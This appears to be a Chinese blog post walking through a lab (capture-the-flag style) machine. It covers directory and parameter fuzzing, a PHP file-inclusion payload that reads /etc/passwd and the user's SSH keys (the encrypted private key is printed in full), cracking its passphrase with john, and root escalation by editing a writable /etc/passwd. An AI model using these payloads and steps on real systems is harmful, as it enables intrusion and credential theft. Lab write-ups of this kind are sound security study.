<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>week6 | xiaoqiuxx's Blog</title><meta name="keywords" content="靶机"><meta name="author" content="xiaoqiuxx"><meta name="copyright" content="xiaoqiuxx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="第六周工具安装这里首先安装一些后续要使用的工具 1、gobuster  这也是一个目录爆破的工具，然后这里kali的话默认不安装，我们直接输入命令会提示是否安装，输入y即可。  2、seclists #这是一个字典大合集，也是输入命令然后选择y安装即可。   默认的安装目录在 &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;  其中Discovery里面就有web目录的字典Web-Content  可以看">
<meta property="og:type" content="article">
<meta property="og:title" content="week6">
<meta property="og:url" content="http://xiaoqiuxx.xyz/2023/03/28/week6/index.html">
<meta property="og:site_name" content="xiaoqiuxx&#39;s Blog">
<meta property="og:description" content="第六周工具安装这里首先安装一些后续要使用的工具 1、gobuster  这也是一个目录爆破的工具，然后这里kali的话默认不安装，我们直接输入命令会提示是否安装，输入y即可。  2、seclists #这是一个字典大合集，也是输入命令然后选择y安装即可。   默认的安装目录在 &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;  其中Discovery里面就有web目录的字典Web-Content  可以看">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg">
<meta property="article:published_time" content="2023-03-28T11:58:55.000Z">
<meta property="article:modified_time" content="2023-03-28T11:59:53.512Z">
<meta property="article:author" content="xiaoqiuxx">
<meta property="article:tag" content="靶机">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://xiaoqiuxx.xyz/2023/03/28/week6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'week6',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-28 19:59:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/xiaoqiuxx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">xiaoqiuxx's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">week6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-28T11:58:55.000Z" title="发表于 2023-03-28 19:58:55">2023-03-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-28T11:59:53.512Z" title="更新于 2023-03-28 19:59:53">2023-03-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="week6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="第六周"><a href="#第六周" class="headerlink" title="第六周"></a>第六周</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><p>这里首先安装一些后续要使用的工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、gobuster</span><br></pre></td></tr></table></figure>

<p>这也是一个目录爆破的工具，然后这里kali的话默认不安装，我们直接输入命令会提示是否安装，输入y即可。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230326213023098.png" alt="image-20230326213023098"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2、seclists #这是一个字典大合集，也是输入命令然后选择y安装即可。</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230326213151406.png" alt="image-20230326213151406"></p>
<p>默认的安装目录在</p>
<p><code>/usr/share/seclists/</code></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230326213229255.png" alt="image-20230326213229255"></p>
<p>其中Discovery里面就有web目录的字典<code>Web-Content</code></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230326213405599.png" alt="image-20230326213405599"></p>
<p>可以看到非常多的字典</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>不多说。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230326212156934.png" alt="image-20230326212156934"></p>
<p>这里可以发现80端口开启了http服务，那么就可以通过浏览器去进行访问测试。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327090707144.png" alt="image-20230327090707144"></p>
<p>进来发现只有一个apache的首页，那么就需要进行一个目录的爆破测试了。这里就使用我们上面安装好的工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.18.7/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里就是 -u 指定url  -w 指定字典  -x 指定要爆破的文件类型</span></span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327091233887.png" alt="image-20230327091233887"></p>
<p>最后我们扫描结果可以发现一个<code>secret</code>目录，然后就没有其他的情况了。还有一个robots.txt</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327091342748.png" alt="image-20230327091342748"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327091320168.png" alt="image-20230327091320168"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327094533856.png" alt="image-20230327094533856"></p>
<p>这里直接去访问<code>secret</code>也是空白的页面。然后这里我们查看源代码也是没有东西的，那么我们是可以进行二级目录的爆破的。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327094643901.png" alt="image-20230327094643901"></p>
<p>我们在实战中也是可以这样使用的，深度爬取是非常有必要的。有利于我们发现更多的信息</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327094806880.png" alt="image-20230327094806880"></p>
<p>这里可以发现扫描出现一个<code>evil.php</code>，名字就是那种恶意php文件。但是方式依旧是空白的，这里我们就需要使用到另一种攻击手段。</p>
<p><code>Fuzz 参数</code></p>
<h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><p>我们都知道php前后端交互主要通过传参。</p>
<p>比如</p>
<p><code>http://example.com/hello.php?a=b</code>，参数为a，值为b。那么如果我们访问页面空白但是存在这么一个php文件的话，我们可以通过去爆破参数有可能就可以触发它的一些处理逻辑。</p>
<p>这里参数名字典在我们安装的<code>seclists</code>内已经存在，参数值字典的话我们可以自己手动定义一个。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327100319105.png" alt="image-20230327100319105"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w val.txt:VAL -u http://192.168.18.7/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ffuf是工具的名称 -w指定字典  第一个字典为参数名的 :PARAM把这个字典命名为param  第二个字典指定为参数值命名为:VAL  然后-u指定url然后把命名放上去进行爆破  -fs为过滤  0表示返回内容为0   -fs 0就是过滤返回值为0的内容</span></span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327100740955.png" alt="image-20230327100740955"></p>
<p>但是这里我们可以发现并没有出现任何数据，这时候可以想到有一种漏洞可能并不是我们指定的值，比如文件包含漏洞，这里的话我们就可以直接手动指定一个值即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.18.7/secret/evil.php?FUZZ=../index.html -fs 0</span><br></pre></td></tr></table></figure>

<p>这里的话因为我们知道前面存在一个index.html页面，所以直接指定即可。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327100947312.png" alt="image-20230327100947312"></p>
<p>这里可以看到成功fuzz出一个参数<code>command</code></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327101015450.png" alt="image-20230327101015450"></p>
<p>输入测试发现确实成功了，那么我们可以确定它是存在这么一个漏洞的。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.18.7/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327101049608.png" alt="image-20230327101049608"></p>
<p>这里我们可以利用php的伪协议去读取到目标文件的源代码</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327101820922.png" alt="image-20230327101820922"></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.18.7/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">解码之后的内容就是这个，就是一个文件包含的参数</span><br></pre></td></tr></table></figure>

<p>这里的话，我们清楚它存在一个文件包含的漏洞，文件包含漏洞也有很多方式可以getshell，但是这里就不一一尝试了。</p>
<h3 id="ssh公钥认证"><a href="#ssh公钥认证" class="headerlink" title="ssh公钥认证"></a>ssh公钥认证</h3><p>前面通过文件包含去查看了<code>/etc/passwd</code>文件，发现存在账户<code>mowree</code>。同时靶机也是开启了ssh服务的。那么我们可以去测试连接查看是否能得到一些有用的信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh mowree@ip -v  #-v参数可以查看连接的一些详细信息</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327102728110.png" alt="image-20230327102728110"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327102818220.png" alt="image-20230327102818220"></p>
<p>在这里可以查看到目标ssh支持两种登录方式，密钥登录和密码登录。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/damoxilai/p/16672336.html</span><br></pre></td></tr></table></figure>

<p>如果可以采用密钥登录ssh的话，那么目标账户文件夹下就会存在<code>.ssh</code>这么隐藏文件夹。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">公钥： .ssh/authorized_keys</span><br><span class="line">私钥： .ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>这里知道了文件的位置，那么我们就可以尝试使用文件包含漏洞去读取</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.18.7/secret/evil.php?command=/home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327103324478.png" alt="image-20230327103324478"></p>
<p>这里成功的读取到了公钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.18.7/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327103414657.png" alt="image-20230327103414657"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>公私密钥现在我们都已经清楚了。</p>
<p>现在我们就可以利用公钥认证的机制去登录到目标的服务器。</p>
<p>目标服务器存储公钥，我们本地指定私钥。那么就可以进行一个身份认证了。</p>
<p>我们在本机创建一个<code>id_rsa</code>文件，将上面获取的私钥粘贴进去。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327103824594.png" alt="image-20230327103824594"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327103854781.png" alt="image-20230327103854781"></p>
<p>同时还需要赋予这么一个600的权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh mowree@ip -i id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327104544101.png" alt="image-20230327104544101"></p>
<p>结果发现我们还是需要一个密码，这个密码是用来加密私钥文件的。这个时候我们能想到的就是是否可以去爆破密码。当然会可以。这里可以使用到一个字典。<code>rockyou.txt</code>，这个字典非常大，kali自带。然后我们把它复制到我们的文件夹，然后进行解压缩。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327104658260.png" alt="image-20230327104658260"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327104755067.png" alt="image-20230327104755067"></p>
<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>这里密码爆破工具我们选择<code>john</code>，这里对这个私钥的加密密码爆破之前需要先转换私钥的文件格式。这个<code>john</code>也是自带这么一个脚本的。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105216096.png" alt="image-20230327105216096"></p>
<p>这里进入到<code>john</code>的文件夹底下，然后选择这个脚本，选择我们的私钥文件，然后把它转换为hash这个文件。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105315718.png" alt="image-20230327105315718"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105435894.png" alt="image-20230327105435894"></p>
<p>这里可以发现密码已经爆破出来了</p>
<p><code>unicorn</code></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105532513.png" alt="image-20230327105532513"></p>
<p>这里我们重新登录然后输入爆破出来的密码。这样就可以成功登录到目标服务器了。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105710777.png" alt="image-20230327105710777"></p>
<p>这里拿到第一个flag</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105750442.png" alt="image-20230327105750442"></p>
<p>几个方式都测试没有发现可以利用的提权方法。这个时候我们就可以查找是否存在suid标志的文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327105906233.png" alt="image-20230327105906233"></p>
<p>这里可以发现这些命令也是比较正常的，没有可以进行利用的命令。</p>
<p>这个时候还有一个思路就是去查找我们可以写入的文件，如果该文件是通过高权限用户运行的，那么我们也是可以提权的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / writable 2&gt;/dev/null | grep run | grep proc | grep sys····</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里我们可以查询我们当前用户可写的文件，然后通过管道符去过滤到不需要的文件。</span></span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327113313676.png" alt="image-20230327113313676"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327113552233.png" alt="image-20230327113552233"></p>
<p>这里会发现一个奇怪的文件<code>/etc/passwd</code>，这个文件按道理来说是不应该可写的。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327113641629.png" alt="image-20230327113641629"></p>
<p>可以看到，作为普通用户来说我们不可写，可以读。但是目标靶机用户却是可以读写的。那么这里肯定是配置错误的。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327113712071.png" alt="image-20230327113712071"></p>
<p>我们都知道<code>/etc/passwd</code>这个文件保存了linux用户的信息，包括密码。但是现在linux采取的方式是密码另外存在一个文件<code>/etc/shadow</code>。但是如果我们在<code>/etc/passwd</code>内指定了密码的话那么<code>/etc/shadow</code>的密码将会被覆盖。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327114246029.png" alt="image-20230327114246029"></p>
<p>在passwd文件内，这个x就是指代的用户密码，因为所有用户对这个文件都是可读的，那么处于安全考虑的话就采取了上述的操作。使用一个x来占位。</p>
<p>那么因为我们可以对这个文件进行修改，那么我们就可以手动给root用户指定一个密码。但是这个密码是需要先加密生成的。</p>
<p>这里我们可以使用openssl去生成密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 #-1指定的是一种加密算法，然后输入我们要设定的密码</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327114511043.png" alt="image-20230327114511043"></p>
<p>复制这个密码。</p>
<p>然后输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327142721777.png" alt="image-20230327142721777"></p>
<p>先把光标移到这个x上面，然后按<code>x</code>键就可以删除这个x了</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327142459802.png" alt="image-20230327142459802"></p>
<p>然后按方向键回到前面那个冒号。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327143858924.png" alt="image-20230327143858924"></p>
<p>然后这里按<code>i</code>进入编辑模式。把我们的加密密码复制过去。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327144042076.png" alt="image-20230327144042076"></p>
<p>然后按<code>esc</code>键退出编辑模式。输入<code>:</code>进入命令模式  然后就是wq了。</p>
